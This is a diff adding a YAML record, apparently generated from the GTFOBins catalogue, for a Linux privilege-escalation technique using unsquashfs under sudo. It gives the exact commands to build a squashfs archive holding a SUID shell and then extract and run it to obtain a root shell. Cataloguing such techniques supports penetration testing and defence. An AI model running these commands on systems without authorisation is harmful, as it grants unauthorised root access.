@@ -1,0 +1,85 @@
+id: gtfobins/unsquashfs/privilege-escalation/sudo
+type: binary
+platform: linux
+name: unsquashfs
+phases:
+- privilege-escalation
+capabilities:
+- privilege-escalation
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'unsquashfs shell
+
+    ./squashfs-root/sh -p'
+references:
+- https://gtfobins.github.io/gtfobins/unsquashfs/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        unsquashfs:
+          comment: '`unsquashfs` preserve the SUID bit when extracting the file system. For example, prepare
+            an archive beforehand with the following commands as root:
+
+
+            ```
+
+            cp /bin/sh .
+
+            chmod +s sh
+
+            mksquashfs sh shell
+
+            ```'
+          functions:
+            privilege-escalation:
+            - code: 'unsquashfs shell
+
+                ./squashfs-root/sh -p'
+              contexts:
+                sudo: null
+                suid: null
+    upstream_url: https://gtfobins.github.io/gtfobins/unsquashfs/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:277d7411d190643fa4ba3aadd60c70fd1b3f16a72d3250a8680a43f5c5431ed1
